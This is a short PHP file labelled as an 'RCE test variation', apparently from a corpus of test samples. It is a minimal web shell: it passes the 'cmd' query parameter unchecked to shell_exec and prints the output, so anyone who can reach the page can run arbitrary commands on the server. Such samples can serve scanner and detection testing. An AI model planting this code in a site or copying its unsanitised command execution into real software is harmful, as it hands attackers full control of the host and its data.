<?php
// RCE test variation #1286
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>